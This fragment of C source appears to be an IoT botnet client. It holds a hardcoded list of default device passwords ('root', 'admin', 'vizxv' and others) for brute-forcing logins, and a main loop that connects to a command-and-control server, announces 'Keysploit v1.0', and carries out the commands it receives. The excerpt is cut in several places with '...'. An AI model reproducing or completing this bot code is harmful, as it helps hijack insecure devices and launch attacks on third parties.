...
char *passwords[] = {"root\0", "toor\0", "admin\0", "user\0", "guest\0", "login\0", "changeme\0", "1234\0", "12345\0", "123456\0", "default\0", "pass\0", "password\0", "support\0", "vizxv\0","(null)\0"};
...
int main(int argc, unsigned char *argv[])
{
	...
	srand(time(NULL) ^ getpid());
        ...
        while(1)
        {
                ...
                int i = 0;
				int n;
				sockprintf(mainCommSock, "@login guest Keysploit v1.0");
				memset(commBuf,0,4096);
				
                while((got = read(mainCommSock, commBuf, 4096)) != 0)
                {
						...
						//printf("Data recieved: %s : %d\n",commBuf, sizeof(commBuf));//"Attack sent.");
						...
						processCmd(i, args);
						memset(args, 0, 10);
                        /*if(StartsWith(commBuf, "!"))
                        {
                                unsigned char *command = toupper(args[1]);
...
//                                                sockprintf(mainCommSock, "%s", buf);
                                ...
                                int paramsCount = 1;
                                unsigned char *pch = strtok(commBuf, " ");
                                params[0] = command;
								...
								sockprintf(mainCommSock, paramsCount);
